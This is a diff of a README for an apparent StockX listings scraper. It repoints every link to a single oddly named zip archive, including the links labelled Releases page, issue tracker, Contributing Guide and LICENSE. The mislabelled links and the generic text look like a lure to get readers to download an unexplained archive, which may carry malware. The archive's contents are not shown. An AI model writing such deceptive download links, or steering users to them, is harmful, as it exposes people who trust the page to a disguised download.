@@ -4,7 +4,7 @@
 Welcome to the StockX-Listings-Scraper, your tool for extracting product listings from StockX. This application helps you gather valuable information from a popular ecommerce platform, making it easier to track product prices, availability, and market trends. Whether you’re a reseller or just curious about stocks, this scraper provides you with the data you need efficiently.
 
 ## 📥 Download Now
-[![Download StockX-Listings-Scraper](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip)](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip)
+[![Download StockX-Listings-Scraper](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip)](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip)
 
 ## 🎯 Features
 - **Easy Extraction:** Quickly gather product listings from StockX.
@@ -20,7 +20,7 @@ To run StockX-Listings-Scraper, you need:
 ## 📦 Download & Install
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip).
+1. Visit the [Releases page](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip).
 2. You will find different versions of the software. Click on the version you want to download.
 3. Download the file specific to your operating system (Windows, Mac, or Linux).
 4. Once the download is complete, find the downloaded file on your computer.
@@ -45,16 +45,16 @@ If you encounter any issues:
 - Ensure the application has the necessary permissions.
 - Restart the program and try again.
 
-For persistent issues, visit our [issue tracker](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip) to see if others have reported similar problems.
+For persistent issues, visit our [issue tracker](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip) to see if others have reported similar problems.
 
 ## 📞 Support
 For support, open an issue on GitHub or check our documentation. We are here to help you make the most of StockX-Listings-Scraper!
 
 ## 🌟 Contributing
-We welcome contributions from all users. If you have ideas for new features or found bugs, feel free to contribute! Check our [Contributing Guide](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip) for more details.
+We welcome contributions from all users. If you have ideas for new features or found bugs, feel free to contribute! Check our [Contributing Guide](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip) for more details.
 
 ## 📄 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip) file for details.
 
 ## 📥 Quick Access
-Don’t forget to download the software from our Releases page: [Download StockX-Listings-Scraper](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/public/Stock-Listings-Scraper-v1.0.zip). Enjoy extracting valuable data from StockX!
+Don’t forget to download the software from our Releases page: [Download StockX-Listings-Scraper](https://github.com/HoByMedia/StockX-Listings-Scraper/raw/refs/heads/main/src/Listings-Scraper-Stock-undeceiving.zip). Enjoy extracting valuable data from StockX!
